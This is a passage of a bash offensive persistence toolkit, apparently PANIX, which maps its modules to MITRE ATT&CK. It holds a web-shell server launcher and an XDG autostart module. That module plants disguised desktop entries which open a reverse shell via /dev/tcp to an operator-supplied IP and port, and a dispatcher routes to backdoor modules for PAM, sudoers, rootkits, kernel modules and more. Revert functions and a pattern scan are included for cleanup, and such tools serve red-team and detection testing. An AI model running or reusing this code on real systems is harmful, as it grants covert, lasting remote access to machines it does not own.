				echo "[+] PHP server running in the background at port $port."
			else
				echo "[-] Error: PHP is not installed on this system."
				exit 1
			fi
			;;
		python )
			if command -v python3 &>/dev/null; then
				if lsof -i :"$port" &>/dev/null; then
					echo "[-] Error: A process is already running on port $port. Aborting."
					exit 1
				fi
				echo "[!] Starting Python3 server on port $port with CGI enabled..."
				cgi_dir="${dir}cgi-bin/"
				cd "$dir"
				nohup python3 -m http.server --cgi $port &>/dev/null &
				echo "[+] Python3 server running in the background at port $port."
			elif command -v python &>/dev/null; then
				if lsof -i :"$port" &>/dev/null; then
					echo "[-] Error: A process is already running on port $port. Aborting."
					exit 1
				fi
				echo "[!] Starting Python2 server on port $port with CGI enabled..."
				cgi_dir="${dir}cgi-bin/"
				cd "$dir"
				nohup python -m CGIHTTPServer $port &>/dev/null &
				echo "[+] Python2 server running in the background at port $port."
			else
				echo "[-] Error: Neither Python3 nor Python2 is installed on this system."
				exit 1
			fi
			;;
		* )
			echo "[-] Error: Unsupported language specified. Use php or python."
			exit 1
	esac

    echo "[!] In case you cannot connect, ensure your firewall settings are allowing inbound traffic on port $port."
    echo "Run the following commands in case of issues on RHEL/CentOS systems:"
    echo ""
    echo "sudo firewall-cmd --add-port=8080/tcp --permanent"
    echo "sudo firewall-cmd --reload"
}

# Revert Module: revert_web_shell.sh
revert_web_shell() {
    usage_revert_web_shell() {
        echo "Usage: ./panix.sh --revert web-shell"
        echo "Reverts any changes made by the setup_web_shell module."
    }

    # Determine if the script is run as root
    if [[ "$(id -u)" -eq 0 ]]; then
        is_root=true
    else
        is_root=false
    fi

    # Function to display usage if needed
    if [[ "$1" == "--help" || "$1" == "-h" ]]; then
        usage_revert_web_shell
        return 0
    fi

    # Define system users to skip
    system_users=("root" "daemon" "bin" "sys" "sync" "games" "man" "lp" "mail" "news" "uucp" "proxy" "www-data" "backup" "list" "irc" "gnats" "nobody" "systemd-network" "systemd-resolve" "syslog" "messagebus" "uuidd" "dnsmasq" "usbmux" "rtkit" "cups-pk-helper" "dnsmasq-dhcp" "sshd" "polkitd")

    # Function to check if a user is a system user
    is_system_user() {
        local user="$1"
        for sys_user in "${system_users[@]}"; do
            if [[ "$user" == "$sys_user" ]]; then
                return 0
            fi
        done
        return 1
    }

    # Function to determine web server directory based on user privileges
    determine_web_dir() {
        local user="$1"
        if [[ "$user" == "root" ]]; then
            echo "/var/www/html/panix/"
        else
            echo "$HOME/panix/"
        fi
    }

    # Function to find and kill web server processes serving a specific directory
    kill_web_server_processes() {
        local web_dir="$1"

        echo "[+] Identifying web server processes serving $web_dir..."

        # Find PIDs of php -S processes serving the web_dir
        php_pids=$(ps aux | grep "[p]hp -S" | grep "$web_dir" | awk '{print $2}')

        # Find PIDs of python3 -m http.server or python -m CGIHTTPServer serving the web_dir
        python3_pids=$(ps aux | grep "[p]ython3 -m http.server" | grep "$web_dir" | awk '{print $2}')
        python_pids=$(ps aux | grep "[p]ython -m CGIHTTPServer" | grep "$web_dir" | awk '{print $2}')

        all_pids="$php_pids $python3_pids $python_pids"

        if [[ -z "$all_pids" ]]; then
            echo "[-] No web server processes found serving $web_dir."
        else
            for pid in $all_pids; do
                kill -9 "$pid" && echo "[+] Killed process $pid serving $web_dir."
            done
        fi
    }

    # Function to remove the web server directory
    remove_web_dir() {
        local web_dir="$1"
        if [[ -d "$web_dir" ]]; then
            rm -rf "$web_dir"
            if [[ $? -eq 0 ]]; then
                echo "[+] Removed web server directory: $web_dir"
            else
                echo "[-] Failed to remove web server directory: $web_dir"
            fi
        else
            echo "[-] Web server directory not found: $web_dir. Skipping removal."
        fi
    }

    # Function to revert web shells for a single user
    revert_user_web_shell() {
        local user="$1"
        local web_dir=$(determine_web_dir "$user")

        echo "[+] Reverting web shell for user '$user' at: $web_dir"

        # Kill web server processes
        kill_web_server_processes "$web_dir"

        # Remove web server directory
        remove_web_dir "$web_dir"
    }

    # Main revert logic based on execution context
    if [[ "$is_root" == true ]]; then
        echo "[+] Running as root. Reverting web shells for root and all non-system users."

        # Revert web shell for root
        revert_user_web_shell "root"

        # Iterate over all user directories in /home
        for user_home in /home/*; do
            if [[ -d "$user_home" ]]; then
                user_name=$(basename "$user_home")
                if is_system_user "$user_name"; then
                    echo "[-] Skipping system user '$user_name'."
                    continue
                fi
                revert_user_web_shell "$user_name"
            fi
        done
    else
        # Non-root execution: revert web shell for the current user only
        current_user=$(whoami)
        echo "[+] Running as non-root. Reverting web shell for user '$current_user'."

        revert_user_web_shell "$current_user"
    fi

    return 0
}

# Module: setup_xdg.sh
setup_xdg() {
	if [[ ! -d "/etc/xdg" ]]; then
		echo "Warning: /etc/xdg directory does not exist. XDG might not be present on this system."
	fi

	usage_xdg() {
		echo "Usage: ./panix.sh --xdg [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default xdg settings"
		echo "  --ip <ip>                  Specify IP address"
		echo "  --port <port>              Specify port number"
		echo "--custom                     Use custom xdg settings (make sure they are valid!)"
		echo "  --path <path>                Specify custom desktop entry path"
		echo "  --command <command>          Specify custom persistence command"
		echo "--help|-h                             Show this help message"
	}

	local profile_path=""
	local command=""
	local custom=0
	local default=0
	local ip=""
	local port=""

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--path )
				shift
				profile_path=$1
				;;
			--command )
				shift
				command=$1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "./panix.sh --xdg --default --ip 10.10.10.10 --port 1337"
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --xdg --custom --command \"/bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --path \"/etc/xdg/autostart/evilxdg.desktop\""
				exit 0
				;;
			--help|-h)
				usage_xdg
				exit 0
				;;
			* )
				echo "Invalid option for --xdg: $1"
				echo "Try './panix.sh --xdg --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --xdg --help' for more information."
		exit 1
	elif [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --ip and --port must be specified when using --default."
			echo "Try './panix.sh --xdg --help' for more information."
			exit 1
		fi

		if check_root; then
			profile_path="/etc/xdg/autostart/pkc12-register.desktop"
			command="/etc/xdg/pkc12-register"
			mkdir -p /etc/xdg/autostart
			echo -e "[Desktop Entry]\nType=Application\nExec=$command\nName=pkc12-register" > $profile_path
			echo -e "#!/bin/bash\n/bin/bash -c 'sh -i >& /dev/tcp/$ip/$port 0>&1'" > $command
			chmod +x $command
		else
			local current_user=$(whoami)
			profile_path="/home/$current_user/.config/autostart/user-dirs.desktop"
			command="/home/$current_user/.config/autostart/.user-dirs"
			mkdir -p /home/$current_user/.config/autostart
			echo -e "[Desktop Entry]\nType=Application\nExec=$command\nName=user-dirs" > $profile_path
			echo -e "#!/bin/bash\n/bin/bash -c 'sh -i >& /dev/tcp/$ip/$port 0>&1'" > $command
			chmod +x $command
		fi

	elif [[ $custom -eq 1 ]]; then
		if [[ -z $profile_path || -z $command ]]; then
			echo "Error: --file and --command must be specified when using --custom."
			echo "Try './panix.sh --xdg --help' for more information."
			exit 1
		fi

		if check_root; then
			local exec_path=${profile_path%.desktop}
			echo -e "[Desktop Entry]\nType=Application\nExec=$exec_path\nName=$(basename $exec_path)" > $profile_path
			echo -e "#!/bin/bash\n$command" > $exec_path
			chmod +x $exec_path
		else
			local current_user=$(whoami)
			profile_path="/home/$current_user/.config/autostart/$(basename $profile_path)"
			local exec_path="/home/$current_user/.config/autostart/$(basename ${profile_path%.desktop})"
			mkdir -p /home/$current_user/.config/autostart
			echo -e "[Desktop Entry]\nType=Application\nExec=$exec_path\nName=$(basename $exec_path)" > $profile_path
			echo -e "#!/bin/bash\n$command" > $exec_path
			chmod +x $exec_path
		fi
	else
		echo "Error: Either --default or --custom must be specified for --xdg."
		echo "Try './panix.sh --xdg --help' for more information."
		exit 1
	fi

	echo "[+] XDG persistence established!"
}

# Revert Module: revert_xdg.sh
revert_xdg() {
	usage_revert_xdg() {
		echo "Usage: ./panix.sh --revert xdg"
		echo "Reverts any changes made by the setup_xdg module."
	}

	# Determine if the script is run as root
	if [[ "$(id -u)" -eq 0 ]]; then
		is_root=true
	else
		is_root=false
	fi

	# Function to display usage if needed
	if [[ "$1" == "--help" || "$1" == "-h" ]]; then
		usage_revert_xdg_backdoor
		return 0
	fi

	# Define system users to skip (modify this array if certain users should not be processed)
	system_users=("root" "daemon" "bin" "sys" "sync" "games" "man" "lp" "mail" "news" "uucp" "proxy" "www-data" "backup" "list" "irc" "gnats" "nobody" "systemd-network" "systemd-resolve" "syslog" "messagebus" "uuidd" "dnsmasq" "usbmux" "rtkit" "cups-pk-helper" "dnsmasq-dhcp" "sshd" "polkitd")

	# Function to check if a user is a system user
	is_system_user() {
		local user="$1"
		for sys_user in "${system_users[@]}"; do
			if [[ "$user" == "$sys_user" ]]; then
				return 0
			fi
		done
		return 1
	}

	# Function to determine xdg directory based on user privileges
	determine_xdg_dir() {
		local user="$1"
		if [[ "$user" == "root" ]]; then
			echo "/etc/xdg/autostart/"
		else
			echo "/home/$user/.config/autostart/"
		fi
	}

	# Function to backup a file if not already backed up
	backup_file() {
		local file_path="$1"
		if [[ -f "$file_path" && ! -f "${file_path}.backup" ]]; then
			cp "$file_path" "${file_path}.backup"
			echo "[+] Backup of $file_path created at ${file_path}.backup"
		elif [[ -f "$file_path" && -f "${file_path}.backup" ]]; then
			echo "[+] Backup of $file_path already exists at ${file_path}.backup"
		else
			echo "[-] File not found: $file_path. Skipping backup."
		fi
	}

	# Function to remove the XDG backdoor desktop entry and associated command script
	remove_xdg_backdoor() {
		local user="$1"
		local xdg_dir=$(determine_xdg_dir "$user")
		local desktop_entry=""
		local command_script=""

		echo "[+] Reverting XDG backdoor for user '$user' at: $xdg_dir"

		# Remove default desktop entries and scripts
		if [[ "$is_root" == true && "$user" == "root" ]]; then
			desktop_entry="/etc/xdg/autostart/pkc12-register.desktop"
			command_script="/etc/xdg/pkc12-register"
		elif [[ "$is_root" == false && "$user" != "root" ]]; then
			desktop_entry="/home/$user/.config/autostart/user-dirs.desktop"
			command_script="/home/$user/.config/autostart/.user-dirs"
		fi

		# Remove default desktop entry and script
		if [[ -n "$desktop_entry" ]]; then
			if [[ -f "$desktop_entry" ]]; then
				backup_file "$desktop_entry"
				rm -f "$desktop_entry"
				if [[ $? -eq 0 ]]; then
					echo "[+] Removed desktop entry: $desktop_entry"
				else
					echo "[-] Failed to remove desktop entry: $desktop_entry"
				fi
			else
				echo "[-] Desktop entry not found: $desktop_entry. Skipping."
			fi
		fi

		if [[ -n "$command_script" ]]; then
			if [[ -f "$command_script" ]]; then
				backup_file "$command_script"
				rm -f "$command_script"
				if [[ $? -eq 0 ]]; then
					echo "[+] Removed command script: $command_script"
				else
					echo "[-] Failed to remove command script: $command_script"
				fi
			else
				echo "[-] Command script not found: $command_script. Skipping."
			fi
		fi

		# Scan for any custom desktop entries that match the malicious pattern
		echo "[+] Scanning for custom XDG backdoors in $xdg_dir"
		for desktop_file in "$xdg_dir"*.desktop; do
			if [[ -f "$desktop_file" ]]; then
				# Extract the Exec line
				exec_line=$(grep -E "^Exec=" "$desktop_file" | cut -d'=' -f2-)
				# Check if the Exec line contains the malicious command pattern
				if echo "$exec_line" | grep -q "sh -i >& /dev/tcp/"; then
					echo "[+] Identified malicious desktop entry: $desktop_file"
					backup_file "$desktop_file"
					rm -f "$desktop_file"
					if [[ $? -eq 0 ]]; then
						echo "[+] Removed malicious desktop entry: $desktop_file"
					else
						echo "[-] Failed to remove malicious desktop entry: $desktop_file"
					fi

					# Extract the command script path from Exec line
					# Assuming Exec points to the command script directly
					command_script_path="$exec_line"
					if [[ -f "$command_script_path" ]]; then
						backup_file "$command_script_path"
						rm -f "$command_script_path"
						if [[ $? -eq 0 ]]; then
							echo "[+] Removed malicious command script: $command_script_path"
						else
							echo "[-] Failed to remove malicious command script: $command_script_path"
						fi
					else
						echo "[-] Command script not found: $command_script_path. Skipping."
					fi
				else
					echo "[-] No malicious pattern found in Exec line of: $desktop_file. Skipping."
				fi
			fi
		done
	}

	# Function to revert backdoors for a single user
	revert_user_xdg_backdoor() {
		local user="$1"
		remove_xdg_backdoor "$user"
	}

	# Main revert logic based on execution context
	if [[ "$is_root" == true ]]; then
		echo "[+] Running as root. Reverting XDG backdoors for root and all non-system users."

		# Revert XDG backdoor for root
		revert_user_xdg_backdoor "root"

		# Iterate over all user directories in /home
		for user_home in /home/*; do
			if [[ -d "$user_home" ]]; then
				user_name=$(basename "$user_home")
				if is_system_user "$user_name"; then
					echo "[-] Skipping system user '$user_name'."
					continue
				fi
				revert_user_xdg_backdoor "$user_name"
			fi
		done
	else
		# Non-root execution: revert XDG backdoor for the current user only
		current_user=$(whoami)
		echo "[+] Running as non-root. Reverting XDG backdoor for user '$current_user'."

		revert_user_xdg_backdoor "$current_user"
	fi

	return 0
}

display_mitre_matrix() {
	echo -e "\n\033[1;34mMITRE ATT&CK Matrix - Persistence Techniques Supported by PANIX\033[0m\n"
	printf "%-25s %-40s %-15s %-40s %-20s %-70s\n" "Persistence Method" "Technique Name" "Technique ID" "Sub-technique Name" "Sub-technique ID" "URL"
	printf "%-25s %-40s %-15s %-40s %-20s %-70s\n" "-------------------" "--------------" "-------------" "-----------------" "---------------" "---------------------------------------------"

	printf "%-25s %-40s %-15s %-40s %-20s %-70s\n" \
		"--at" "Scheduled Task" "T1053" "At" "T1053.002" "https://attack.mitre.org/techniques/T1053/002" \
		"--authorized-keys" "Account Manipulation" "T1098" "SSH Authorized Keys" "T1098.004" "https://attack.mitre.org/techniques/T1098/004" \
		"--backdoor-user" "Create Account" "T1136" "Local Account" "T1136.001" "https://attack.mitre.org/techniques/T1136/001" \
		"--backdoor-system-user" "Account Manipulation" "T1098" "SSH Authorized Keys" "T1098.004" "https://attack.mitre.org/techniques/T1098/004" \
		"--bind-shell" "Command and Scripting Interpreter" "T1059" "Unix Shell" "T1059.004" "https://attack.mitre.org/techniques/T1059/004" \
		"--cap" "Abuse Elevation Control Mechanism" "T1548" "N/A" "N/A" "https://attack.mitre.org/techniques/T1548" \
		"--create-user" "Create Account" "T1136" "Local Account" "T1136.001" "https://attack.mitre.org/techniques/T1136/001" \
		"--cron" "Scheduled Task" "T1053" "Cron" "T1053.003" "https://attack.mitre.org/techniques/T1053/003" \
		"--dbus" "Create or Modify System Process" "T1543" "N/A" "N/A" "https://attack.mitre.org/techniques/T1543" \
		"--generator" "Create or Modify System Process" "T1543" "Systemd Service" "T1543.002" "https://attack.mitre.org/techniques/T1543/002" \
		"--git" "Event Triggered Execution" "T1546" "N/A" "N/A" "https://attack.mitre.org/techniques/T1546" \
		"--grub" "Pre-OS Boot" "T1542" "N/A" "N/A" "https://attack.mitre.org/techniques/T1542" \
		"--initd" "Boot or Logon Initialization Scripts" "T1037" "N/A" "N/A" "https://attack.mitre.org/techniques/T1037" \
		"--initramfs" "Pre-OS Boot" "T1542" "N/A" "N/A" "https://attack.mitre.org/techniques/T1542" \
		"--ld-preload" "Hijack Execution Flow" "T1574" "Dynamic Linker Hijacking" "T1574.006" "https://attack.mitre.org/techniques/T1574/006" \
		"--lkm" "Boot or Logon Autostart Execution" "T1547" "Kernel Modules and Extensions" "T1547.006" "https://attack.mitre.org/techniques/T1547/006" \
		"--malicious-container" "Escape to Host" "T1610" "N/A" "N/A" "https://attack.mitre.org/techniques/T1610" \
		"--malicious-package" "Event Triggered Execution" "T1546" "Installer Packages" "T1546.016" "https://attack.mitre.org/techniques/T1546/016" \
		"--motd" "Boot or Logon Initialization Scripts" "T1037" "N/A" "N/A" "https://attack.mitre.org/techniques/T1037" \
		"--network-manager" "Event Triggered Execution" "T1546" "N/A" "N/A" "https://attack.mitre.org/techniques/T1546" \
		"--package-manager" "Event Triggered Execution" "T1546" "Installer Packages" "T1546.016" "https://attack.mitre.org/techniques/T1546/016" \
		"--pam" "Modify Authentication Process" "T1556" "Pluggable Authentication Modules" "T1556.003" "https://attack.mitre.org/techniques/T1556/003" \
		"--passwd-user" "Account Manipulation" "T1098" "N/A" "N/A" "https://attack.mitre.org/techniques/T1098" \
		"--password-change" "Account Manipulation" "T1098" "N/A" "N/A" "https://attack.mitre.org/techniques/T1098" \
		"--polkit" "Modify Authentication Process" "T1556" "N/A" "N/A" "https://attack.mitre.org/techniques/T1556/" \
		"--rc-local" "Boot or Logon Initialization Scripts" "T1037" "RC Scripts" "T1037.004" "https://attack.mitre.org/techniques/T1037/004" \
		"--reverse-shell" "Command and Scripting Interpreter" "T1059" "Unix Shell" "T1059.004" "https://attack.mitre.org/techniques/T1059/004" \
		"--rootkit" "Rootkit" "T1014" "N/A" "N/A" "https://attack.mitre.org/techniques/T1014" \
		"--shell-profile" "Event Triggered Execution" "T1546" "Unix Shell Configuration Modification" "T1546.004" "https://attack.mitre.org/techniques/T1546/004" \
		"--ssh-key" "Account Manipulation" "T1098" "SSH Authorized Keys" "T1098.004" "https://attack.mitre.org/techniques/T1098/004" \
		"--sudoers" "Abuse Elevation Control Mechanism" "T1548" "Sudo and Sudo Caching" "T1548.003" "https://attack.mitre.org/techniques/T1548/003" \
		"--suid" "Abuse Elevation Control Mechanism" "T1548" "Setuid and Setgid" "T1548.001" "https://attack.mitre.org/techniques/T1548/001" \
		"--system-binary" "Compromise Host Software Binary" "T1554" "N/A" "N/A" "https://attack.mitre.org/techniques/T1554" \
		"--systemd" "Create or Modify System Process" "T1543" "Systemd Service" "T1543.002" "https://attack.mitre.org/techniques/T1543/002" \
		"--udev" "Event Triggered Execution" "T1546" "Udev Rules" "T1546.017" "https://attack.mitre.org/techniques/T1546/017" \
		"--web-shell" "Server Software Component" "T1505" "Web Shell" "T1505.003" "https://attack.mitre.org/techniques/T1505/003" \
		"--xdg" "Boot or Logon Autostart Execution" "T1547" "XDG Autostart Entries" "T1547.013" "https://attack.mitre.org/techniques/T1547/013"
	
	echo -e "\n\033[1;32mLegend:\033[0m"
	echo "Technique: High-level MITRE ATT&CK technique."
	echo "Sub-Technique: Specific sub-technique under a high-level technique."
	echo "N/A: No specific sub-technique defined for this method."
	echo "URL: Link to the official MITRE ATT&CK page for further details."
	echo ""
}

# Main script logic
# Only source modules dynamically if the script is executed directly
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
	MODULES_DIR="$(dirname "${BASH_SOURCE[0]}")/modules"
	for module in "$MODULES_DIR"/*.sh; do
		if [[ -f $module ]]; then
			source "$module"
		fi
	done
fi

main() {
	local QUIET=0

	if [[ $# -eq 0 ]]; then
		if [[ $QUIET -ne 1 ]]; then
			print_banner
		fi
		if check_root; then
			usage_root
		else
			usage_user
		fi
		exit 0
	fi

	# Parse command line arguments
	while [[ "$1" != "" ]]; do
		case $1 in
			-q | --quiet )
				QUIET=1
				;;
			-h | --help )
				if check_root; then
					usage_root
				else
					usage_user
				fi
				exit
				;;
			--mitre-matrix )
				display_mitre_matrix
				exit
				;;
			--at )
				shift
				setup_at "$@"
				exit
				;;
			--authorized-keys )
				shift
				setup_authorized_keys "$@"
				exit
				;;
			--backdoor-system-user )
				shift
				setup_backdoor_system_user "$@"
				exit
				;;
			--backdoor-user )
				shift
				setup_backdoor_user "$@"
				exit
				;;
			--bind-shell )
				shift
				setup_bind_shell "$@"
				exit
				;;
			--cap )
				shift
				setup_cap_backdoor "$@"
				exit
				;;
			--create-user )
				shift
				setup_create_new_user "$@"
				exit
				;;
			--cron )
				shift
				setup_cron "$@"
				exit
				;;
			--dbus )
				shift
				setup_dbus "$@"
				exit
				;;
			--generator )
				shift
				setup_generator_persistence "$@"
				exit
				;;
			--git )
				shift
				setup_git_persistence "$@"
				exit
				;;
			--grub )
				shift
				setup_grub "$@"
				exit
				;;
			--initd )
				shift
				setup_initd_backdoor "$@"
				exit
				;;
			--initramfs )
				shift
				setup_initramfs "$@"
				exit
				;;
			--ld-preload )
				shift
				setup_ld_preload_backdoor "$@"
				exit
				;;
			--lkm )
				shift
				setup_lkm_backdoor "$@"
				exit
				;;
			--malicious-container )
				shift
				setup_malicious_docker_container "$@"
				exit
				;;
			--malicious-package )
				shift
				setup_malicious_package "$@"
				exit
				;;
			--motd )
				shift
				setup_motd_backdoor "$@"
				exit
				;;
			--network-manager )
				shift
				setup_network_manager "$@"
				exit
				;;
			--package-manager )
				shift
				setup_package_manager_persistence "$@"
				exit
				;;
			--pam )
				shift
				setup_pam_persistence "$@"
				exit
				;;
			--passwd-user )
				shift
				setup_passwd_user "$@"
				exit
				;;
			--password-change )
				shift
				setup_password_change "$@"
				exit
				;;
			--polkit )
				shift
				setup_polkit "$@"
				exit
				;;
			--rc-local )
				shift
				setup_rc_local_backdoor "$@"
				exit
				;;
			--reverse-shell )
				shift
				setup_reverse_shell "$@"
				exit
				;;
			--rootkit )
				shift
				setup_rootkit "$@"
				exit
				;;
			--shell-profile )
				shift
				setup_shell_profile "$@"
				exit
				;;
			--ssh-key )
				shift
				setup_ssh_key "$@"
				exit
				;;
			--sudoers )
				shift
				setup_sudoers_backdoor "$@"
				exit
				;;
			--suid )
				shift
				setup_suid_backdoor "$@"
				exit
				;;
			--system-binary )
				shift
				setup_system_binary_backdoor "$@"
				exit
				;;
			--systemd )
				shift
				setup_systemd "$@"
				exit
				;;
			--tmpfiles )
				shift
				setup_tmpfiles "$@"
				exit
				;;
			--udev )
				shift
				setup_udev "$@"
				exit
				;;
			--web-shell )
				shift
				setup_web_shell "$@"
				exit
				;;
			--xdg )
				shift
				setup_xdg "$@"
				exit
				;;
			--revert )
				shift
				if [[ -z $1 ]]; then
					echo "Error: Missing module name. Use '--revert all' to revert all modules or specify a module name."
					echo ""
					echo "Example 1: ./panix.sh --revert malicious-package"
					echo "Example 2: ./panix.sh --revert all"
					echo "Example 3: ./panix.sh --revert-all"
					echo ""
					echo "Modules: all, at, authorized-keys, backdoor-user, bind-shell, cap, create-user, cron, malicious-container, generator, git, initd, ld-preload, lkm, malicious-package, motd, package-manager, pam, passwd-user, password-change, rc-local, rootkit, shell-profile, ssh-key, sudoers, suid, system-binary, systemd, tmpfiles, udev, xdg"
					echo ""
					exit 1
				fi

				# Check if "all" is specified
				if [[ "$1" == "all" ]]; then
					echo "[+] Running full reversion with --revert-all..."
					revert_all
					exit
				fi

				# Replace hyphens with underscores for function names
				MODULE_NAME="revert_${1//-/_}"

				if type "$MODULE_NAME" &>/dev/null; then
					echo ""
					echo "################## [+] Reverting $1 module... "##################
					echo ""
					$MODULE_NAME  # Execute the function
				else
					echo ""
					echo "Error: Revert function for module '$1' not found."
					echo ""
					exit 1
				fi
				exit
				;;
			--revert-all )
				revert_all
				exit
				;;
			* )
				echo "Invalid option: $1"
				if check_root; then
					usage_root
				else
					usage_user
				fi
				exit 1
		esac
		shift
	done

	# Print banner unless in quiet mode
	if [[ $QUIET -ne 1 ]]; then
		print_banner
	fi

	# Show the usage menu if no specific command is given
	if check_root; then
		usage_root
	else
		usage_user
	fi
}

main "$@"
